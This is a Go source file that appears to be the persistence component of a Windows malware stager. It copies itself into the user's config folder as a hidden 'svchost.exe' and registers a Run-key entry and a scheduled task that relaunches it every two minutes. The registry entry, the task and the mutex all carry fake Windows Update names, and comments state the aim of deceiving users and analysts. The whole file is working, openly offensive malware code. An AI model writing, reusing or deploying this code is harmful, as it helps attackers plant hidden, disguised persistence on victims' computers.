package common

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// INSTALL_NAME is the on-disk masquerade name for the stager.
// svchost.exe reads as a legit, feared system process to casual users,
// and (unlike lsass/csrss) does not trip the protected-process alarm.
var INSTALL_NAME = "svchost.exe"

// MUTEX_NAME must NOT advertise intent to an analyst.
var MUTEX_NAME = "Global\\WindowsUpdateCheck"

var mutexHandle windows.Handle

func InstallSelf() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	appData, err := os.UserConfigDir()
	if err != nil {
		return
	}
	destPath := filepath.Join(appData, INSTALL_NAME)

	if strings.EqualFold(exePath, destPath) {
		return
	}

	srcFile, err := os.ReadFile(exePath)
	if err != nil {
		return
	}
	err = os.WriteFile(destPath, srcFile, 0644)
	if err != nil {
		return
	}

	ptr, _ := syscall.UTF16PtrFromString(destPath)
	attributes, _ := syscall.GetFileAttributes(ptr)
	syscall.SetFileAttributes(ptr, attributes|syscall.FILE_ATTRIBUTE_HIDDEN)

	cmd := exec.Command(destPath)
	cmd.Start()
	os.Exit(0)
}

func CheckForMutex() bool {
	name, _ := windows.UTF16PtrFromString(MUTEX_NAME)
	handle, err := windows.CreateMutex(nil, false, name)
	if err != nil {
		return false
	}
	err = windows.GetLastError()
	if err == windows.ERROR_ALREADY_EXISTS {
		return false
	}
	mutexHandle = handle
	return true
}

func ReleaseMutex() {
	if mutexHandle != 0 {
		windows.CloseHandle(mutexHandle)
	}
}

func InstallRegistryPersistence() {
	appData, _ := os.UserConfigDir()
	destPath := filepath.Join(appData, INSTALL_NAME)

	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err != nil {
		return
	}
	defer key.Close()

	existing, _, _ := key.GetStringValue("WindowsUpdateService")
	if existing == destPath {
		return
	}
	key.SetStringValue("WindowsUpdateService", destPath)
}

func InstallScheduledTask() {
	appData, _ := os.UserConfigDir()
	destPath := filepath.Join(appData, INSTALL_NAME)

	queryCmd := exec.Command("schtasks", "/query", "/tn", "WindowsUpdateCheck")
	queryCmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	if queryCmd.Run() == nil {
		return
	}

	minutes := 2
	cmd := exec.Command("schtasks", "/create", "/sc", "minute", "/mo", fmt.Sprintf("%d", minutes), "/tn", "WindowsUpdateCheck", "/tr", destPath, "/f", "/np")
	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	cmd.Run()
}

func UninstallPersistence() error {
	var errMsgs []string
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
	if err == nil {
		if err := key.DeleteValue("WindowsUpdateService"); err != nil {
			errMsgs = append(errMsgs, fmt.Sprintf("Reg: %v", err))
		}
		key.Close()
	}
	cmd := exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateCheck", "/f")
	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	if err := cmd.Run(); err != nil {
		errMsgs = append(errMsgs, fmt.Sprintf("Task: %v", err))
	}
	if len(errMsgs) > 0 {
		return fmt.Errorf("%s", strings.Join(errMsgs, "; "))
	}
	return nil
}
